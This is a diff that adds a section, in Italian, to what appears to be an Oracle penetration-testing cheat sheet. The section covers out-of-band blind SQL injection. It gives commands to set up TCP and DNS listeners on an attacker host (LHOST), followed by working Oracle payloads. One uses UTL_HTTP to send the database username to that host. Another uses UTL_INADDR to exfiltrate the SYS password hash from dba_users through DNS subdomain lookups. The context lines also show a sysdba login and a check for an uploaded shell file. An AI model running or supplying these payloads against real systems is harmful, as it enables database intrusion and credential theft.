@@ -63,6 +63,37 @@ sqlplus <user>/<pass>@<IP>/<SID> as sysdba            # Login come admin (privil
 curl -X GET http://<IP>/shell.txt                     # Verifica upload
 ```
 
+## OOB con catch
+
+Oracle ha funzioni native per fare richieste HTTP e DNS — ideali per blind SQLi OOB.
+
+```bash
+catch tcp on --port 4444
+catch dns on
+catch dns token
+```
+
+### Blind SQLi — OOB via UTL_HTTP
+
+```sql
+SELECT UTL_HTTP.REQUEST('http://<LHOST>:4444/'||(SELECT user FROM dual)) FROM dual
+```
+→ `catch logs tcp` mostra l'username Oracle nel path della richiesta HTTP.
+
+### Blind SQLi — OOB via UTL_INADDR (DNS)
+
+```sql
+SELECT UTL_INADDR.GET_HOST_ADDRESS('<TOKEN>.<LHOST>') FROM dual
+```
+→ `catch logs dns` mostra la query DNS con il token.
+
+### Esfiltrazione dati via DNS
+
+```sql
+SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM dba_users WHERE username='SYS')||'.<TOKEN>.<LHOST>') FROM dual
+```
+→ L'hash della password appare come subdomain nel log DNS.
+
 ## Tool consigliati
 
 *Installa con `use <tool>` + `install`*
